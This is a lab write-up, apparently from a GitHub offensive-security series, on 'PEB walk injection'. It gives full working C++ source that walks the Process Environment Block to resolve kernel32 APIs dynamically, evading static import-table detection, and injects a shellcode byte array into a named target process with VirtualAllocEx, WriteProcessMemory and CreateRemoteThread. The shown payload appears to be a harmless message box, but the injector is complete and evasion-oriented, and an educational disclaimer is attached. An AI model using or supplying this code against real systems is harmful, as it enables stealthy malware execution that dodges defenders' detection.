<h1 align="center">PEB Walk Injection</h1>
<p align="center">
  <img src="../Assets/peb_AI.jpg" alt="UH" width="500px">
</p>

## Overview
In this lab, we cover PEB Walk and Injection, By using the PEB, the code directly traverses the list of loaded modules to find `kernel32.dll`, bypassing static analysis methods that rely on import table inspection. Once kernel32.dll is identified, the technique resolves necessary API functions such as `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread` dynamically at runtime.

## Steps
1. `Retrieve PEB:` Use inline assembly to obtain the Process Environment Block (PEB) of the current process, which contains information about loaded modules.
2. `Locate kernel32.dll:` Traverse the PEB's linked list of loaded modules to find the base address of kernel32.dll.
3. `Resolve API Functions:` Dynamically load and resolve the addresses of necessary API functions (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread) from kernel32.dll by parsing its export table.
4. `Open Target Process:` Obtain a handle to the target process with appropriate access rights to allow memory manipulation and thread creation.
5. `Allocate Memory:` Use VirtualAllocEx to allocate memory within the target process's address space for the payload.
6. `Write Payload:` Write the payload code into the allocated memory using WriteProcessMemory.
7. `Create Remote Thread:` Create a remote thread in the target process to execute the payload using CreateRemoteThread.

## Walkthrough

This function retrieves the Process ID (PID) of a running process by its name (processName).

```cpp
	DWORD GetProcessIdByName(const std::wstring& processName) {
    DWORD processIds[1024], bytesReturned;
    if (!EnumProcesses(processIds, sizeof(processIds), &bytesReturned)) {
        std::cerr << "Failed to enumerate processes. Error: " << GetLastError() << std::endl;
        return 0;
    }

    DWORD processCount = bytesReturned / sizeof(DWORD);

    for (DWORD i = 0; i < processCount; ++i) {
        if (processIds[i] == 0) continue;

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processIds[i]);
        if (hProcess) {
            WCHAR processNameBuffer[MAX_PATH];
            if (GetModuleFileNameEx(hProcess, NULL, processNameBuffer, MAX_PATH)) {
                std::wstring currentProcessName(processNameBuffer);
                if (currentProcessName.find(processName) != std::wstring::npos) {
                    CloseHandle(hProcess);
                    return processIds[i];
                }
            }
            CloseHandle(hProcess);
        }
    }

    std::cerr << "Process not found." << std::endl;
    return 0;
}

```
Uses inline assembly to get the address of the PEB from the FS register.

```cpp
  __asm {
        mov eax, fs: [0x30]
        mov peb, eax
    }


```
Iterates through the list of loaded modules in the process to find kernel32.dll and obtain its base address.
```cpp
 lEntry = peb->Ldr->InLoadOrderModuleList.Flink;
    do {
        module = CONTAINING_RECORD(lEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        char baseDllName[256];
        int i;
        for (i = 0; i < module->BaseDllName.Length / sizeof(WCHAR) && i < sizeof(baseDllName) - 1; i++) {
            baseDllName[i] = (char)module->BaseDllName.Buffer[i];
        }
        baseDllName[i] = '\0';

        if (_stricmp(baseDllName, "kernel32.dll") == 0) {
            k32baseAddr = (HMODULE)module->DllBase;
        }

        lEntry = lEntry->Flink;
    } while (lEntry != &peb->Ldr->InLoadOrderModuleList);
```
Resolves and uses functions from kernel32.dll to perform further operations like memory allocation and writing.

```cpp
/ ptrGetProcAddress = (GETPROCADDRESS)GetProcAddressKernel32(k32baseAddr, "GetProcAddress");
                ptrLoadLibraryA = (LOADLIBRARYA)GetProcAddressKernel32(k32baseAddr, "LoadLibraryA");
                HMODULE kernel32Base = ptrLoadLibraryA("kernel32.dll");
```
Allocates memory in the target process, writes the payload, and creates a thread to execute it.
```cpp
pVAEx = (VAExType)ptrGetProcAddress(kernel32Base, "VirtualAllocEx");
                pRemoteCode = pVAEx(hProcess, NULL, p_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                pWPM = (WPMType)ptrGetProcAddress(kernel32Base, "WriteProcessMemory");
                pWPM(hProcess, pRemoteCode, (PVOID)code, (SIZE_T)p_len, (SIZE_T*)NULL);
                pCRT = (CRTType)ptrGetProcAddress(kernel32Base, "CreateRemoteThread");
                hThread = pCRT(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);

                if (hThread != NULL) {
                    WaitForSingleObject(hThread, 500);
                    CloseHandle(hThread);
                    return 0;
                }
```

## Full Code
```cpp
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <Psapi.h>


typedef struct _UNICODE_STRING {USHORT Length;USHORT MaximumLength;PWSTR  Buffer;} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG      Flags;
    USHORT     LoadCount;
    USHORT     TlsIndex;
    LIST_ENTRY HashLinks;
    PVOID      SectionPointer;
    ULONG      CheckSum;
    ULONG      TimeDateStamp;
    PVOID      LoadedImports;
    PVOID      EntryPointActivationContext;
    PVOID      PatchInformation;
} LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {ULONG Length; BOOLEAN Initialized; HANDLE SsHandle;LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList;LIST_ENTRY InInitializationOrderModuleList;} PEB_LDR_DATA, * PPEB_LDR_DATA;
typedef struct _PEB { BOOLEAN InheritedAddressSpace; BOOLEAN ReadImageFileExecOptions;  BOOLEAN BeingDebugged; BOOLEAN SpareBool; HANDLE Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA Ldr;} PEB, * PPEB;
typedef FARPROC(WINAPI* GETPROCADDRESS)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);
typedef LPVOID (WINAPI* VAExType)( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef BOOL(WINAPI* WPMType)( HANDLE  hProcess,LPVOID  lpBaseAddress, LPCVOID lpBuffer,SIZE_T  nSize, SIZE_T* lpNumberOfBytesWritten );
typedef HANDLE(WINAPI* CRTType)(HANDLE hProcess, LPSECURITY_ATTRIBUTES  lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags, DWORD lpThreadId);

DWORD GetProcessIdByName(const std::wstring& processName) {
    DWORD processIds[1024], bytesReturned;
    if (!EnumProcesses(processIds, sizeof(processIds), &bytesReturned)) {
        std::cerr << "Failed to enumerate processes. Error: " << GetLastError() << std::endl;
        return 0;
    }

    DWORD processCount = bytesReturned / sizeof(DWORD);

    for (DWORD i = 0; i < processCount; ++i) {
        if (processIds[i] == 0) continue;

        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processIds[i]);
        if (hProcess) {
            WCHAR processNameBuffer[MAX_PATH];
            if (GetModuleFileNameEx(hProcess, NULL, processNameBuffer, MAX_PATH)) {
                std::wstring currentProcessName(processNameBuffer);
                if (currentProcessName.find(processName) != std::wstring::npos) {
                    CloseHandle(hProcess);
                    return processIds[i];
                }
            }
            CloseHandle(hProcess);
        }
    }

    std::cerr << "Process not found." << std::endl;
    return 0;
}

PVOID GetProcAddressKernel32(HMODULE hModule, LPCSTR lpProcName) {
    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDOSHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* pAddressOfFunctions = (DWORD*)((BYTE*)hModule + pExportDirectory->AddressOfFunctions);
    DWORD* pAddressOfNames = (DWORD*)((BYTE*)hModule + pExportDirectory->AddressOfNames);
    WORD* pAddressOfNameOrdinals = (WORD*)((BYTE*)hModule + pExportDirectory->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
        char* functionName = (char*)((BYTE*)hModule + pAddressOfNames[i]);
        if (strcmp(functionName, lpProcName) == 0) {
            return (PVOID)((BYTE*)hModule + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
    }
    return NULL;
}

int main() {

    // code - 32 bit Hi RedTeam Operator
    unsigned char code[] = { 0xd9, 0xeb, 0x9b, 0xd9, 0x74, 0x24, 0xf4, 0x31, 0xd2, 0xb2, 0x77, 0x31,
  0xc9, 0x64, 0x8b, 0x71, 0x30, 0x8b, 0x76, 0x0c, 0x8b, 0x76, 0x1c, 0x8b,
  0x46, 0x08, 0x8b, 0x7e, 0x20, 0x8b, 0x36, 0x38, 0x4f, 0x18, 0x75, 0xf3,
  0x59, 0x01, 0xd1, 0xff, 0xe1, 0x60, 0x8b, 0x6c, 0x24, 0x24, 0x8b, 0x45,
  0x3c, 0x8b, 0x54, 0x28, 0x78, 0x01, 0xea, 0x8b, 0x4a, 0x18, 0x8b, 0x5a,
  0x20, 0x01, 0xeb, 0xe3, 0x34, 0x49, 0x8b, 0x34, 0x8b, 0x01, 0xee, 0x31,
  0xff, 0x31, 0xc0, 0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xcf, 0x0d,
  0x01, 0xc7, 0xeb, 0xf4, 0x3b, 0x7c, 0x24, 0x28, 0x75, 0xe1, 0x8b, 0x5a,
  0x24, 0x01, 0xeb, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x5a, 0x1c, 0x01, 0xeb,
  0x8b, 0x04, 0x8b, 0x01, 0xe8, 0x89, 0x44, 0x24, 0x1c, 0x61, 0xc3, 0xb2,
  0x08, 0x29, 0xd4, 0x89, 0xe5, 0x89, 0xc2, 0x68, 0x8e, 0x4e, 0x0e, 0xec,
  0x52, 0xe8, 0x9f, 0xff, 0xff, 0xff, 0x89, 0x45, 0x04, 0xbb, 0xef, 0xce,
  0xe0, 0x60, 0x87, 0x1c, 0x24, 0x52, 0xe8, 0x8e, 0xff, 0xff, 0xff, 0x89,
  0x45, 0x08, 0x68, 0x6c, 0x6c, 0x20, 0x41, 0x68, 0x33, 0x32, 0x2e, 0x64,
  0x68, 0x75, 0x73, 0x65, 0x72, 0x30, 0xdb, 0x88, 0x5c, 0x24, 0x0a, 0x89,
  0xe6, 0x56, 0xff, 0x55, 0x04, 0x89, 0xc2, 0x50, 0xbb, 0xa8, 0xa2, 0x4d,
  0xbc, 0x87, 0x1c, 0x24, 0x52, 0xe8, 0x5f, 0xff, 0xff, 0xff, 0x68, 0x44,
  0x65, 0x76, 0x58, 0x68, 0x20, 0x4d, 0x61, 0x6c, 0x68, 0x52, 0x54, 0x4f,
  0x3a, 0x31, 0xdb, 0x88, 0x5c, 0x24, 0x0b, 0x89, 0xe3, 0x68, 0x72, 0x21,
  0x58, 0x20, 0x68, 0x72, 0x61, 0x74, 0x6f, 0x68, 0x20, 0x4f, 0x70, 0x65,
  0x68, 0x54, 0x65, 0x61, 0x6d, 0x68, 0x52, 0x65, 0x64, 0x20, 0x68, 0x72,
  0x6f, 0x6d, 0x20, 0x68, 0x48, 0x69, 0x20, 0x66, 0x31, 0xc9, 0x88, 0x4c,
  0x24, 0x1a, 0x89, 0xe1, 0x31, 0xd2, 0x52, 0x53, 0x51, 0x52, 0xff, 0xd0,
  0x31, 0xc0, 0x50, 0xff, 0x55, 0x08 };
    unsigned int p_len = sizeof(code);
 

    PEB* peb;
    PLDR_DATA_TABLE_ENTRY module;
    LIST_ENTRY* lEntry;
    HMODULE k32baseAddr = NULL;
    GETPROCADDRESS ptrGetProcAddress = NULL;
    LOADLIBRARYA ptrLoadLibraryA = NULL;
    VAExType pVAEx;
    WPMType pWPM;
    CRTType pCRT;

    
    __asm {
        mov eax, fs: [0x30]
        mov peb, eax
    }


    lEntry = peb->Ldr->InLoadOrderModuleList.Flink;
    do {
        module = CONTAINING_RECORD(lEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

        char baseDllName[256];
        int i;
        for (i = 0; i < module->BaseDllName.Length / sizeof(WCHAR) && i < sizeof(baseDllName) - 1; i++) {
            baseDllName[i] = (char)module->BaseDllName.Buffer[i];
        }
        baseDllName[i] = '\0';

        if (_stricmp(baseDllName, "kernel32.dll") == 0) {
            k32baseAddr = (HMODULE)module->DllBase;
        }

        lEntry = lEntry->Flink;
    } while (lEntry != &peb->Ldr->InLoadOrderModuleList);

    if (k32baseAddr) {
        
        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;
        std::wstring processName = L"Task Explorer.exe"; // Replace with your process name 32-bit
        DWORD pid = GetProcessIdByName(processName);
        if (pid) {
            printf("Process ID = %d \n", pid);
            //try to open target process
            HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                FALSE, pid);

            if (hProcess != NULL) {
            
                ptrGetProcAddress = (GETPROCADDRESS)GetProcAddressKernel32(k32baseAddr, "GetProcAddress");
                ptrLoadLibraryA = (LOADLIBRARYA)GetProcAddressKernel32(k32baseAddr, "LoadLibraryA");
                HMODULE kernel32Base = ptrLoadLibraryA("kernel32.dll");
                pVAEx = (VAExType)ptrGetProcAddress(kernel32Base, "VirtualAllocEx");
                pRemoteCode = pVAEx(hProcess, NULL, p_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                pWPM = (WPMType)ptrGetProcAddress(kernel32Base, "WriteProcessMemory");
                pWPM(hProcess, pRemoteCode, (PVOID)code, (SIZE_T)p_len, (SIZE_T*)NULL);
                pCRT = (CRTType)ptrGetProcAddress(kernel32Base, "CreateRemoteThread");
                hThread = pCRT(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);

                if (hThread != NULL) {
                    WaitForSingleObject(hThread, 500);
                    CloseHandle(hThread);
                    return 0;
                }

                return -1;
                CloseHandle(hProcess);
            }

        }
    }
    return 0;
}

``` 
### Note
In this lab, we use PEB structure to resolve APIs dynamically to avoid the static inspection. I will prefer to read my blog post to better understand the impact of PEB walk and PEB walk with API obfuscation technique.

https://systemweakness.com/peb-walk-avoid-api-calls-inspection-in-iat-by-analyst-and-bypass-static-detection-of-1a2ef9bd4c94

## Demonstration

![](Asset/PE.gif)

For GitHub-Repo Click Here: [Offensive-Panda/ProcessInjectionTechniques](https://github.com/Offensive-Panda/ProcessInjectionTechniques/tree/main/PEB_WALK_INJECTION/PEB_WALK_INJECTION)

### Disclaimer
The content provided on this series is for educational and informational purposes only. It is intended to help users understand cybersecurity concepts and techniques for improving security defenses!
